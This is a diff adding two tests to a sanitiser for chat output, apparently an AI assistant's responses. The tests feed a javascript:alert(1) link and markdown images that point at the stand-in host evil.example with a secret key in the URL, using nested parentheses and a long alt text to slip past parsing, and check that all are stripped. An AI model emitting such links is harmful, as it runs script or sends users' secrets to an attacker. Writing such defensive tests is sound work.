@@ -128,3 +128,21 @@ test("flag on: hostile repeated markup is handled in one pass and stays correct"
   assert.equal(/javascript:/i.test(textOf(mixed)), false);
   assert.equal(textOf(mixed).includes("https://a.example/p.png"), true);
 });
+
+test("flag on: an angle-bracketed javascript: link destination is neutralised", async () => {
+  const out = await run(chat("[open](<javascript:alert(1)>) [ok](https://ok.example/)"), true);
+  const text = textOf(out);
+  assert.equal(/javascript:/i.test(text), false);
+  assert.match(text, /\[ok\]\(https:\/\/ok\.example\/\)/);
+});
+
+test("flag on: an exfil image is removed when its URL has balanced parentheses or a long alt", async () => {
+  const parens = await run(chat(`a ![x](https://evil.example/(p)?k=${KEY}) b`), true);
+  assert.equal(textOf(parens).includes("evil.example"), false);
+  assert.equal(textOf(parens).includes(KEY), false);
+  const longAlt = await run(
+    chat(`a ![${"y".repeat(600)}](https://evil.example/p?k=${KEY}) b`),
+    true
+  );
+  assert.equal(textOf(longAlt).includes("evil.example"), false);
+});
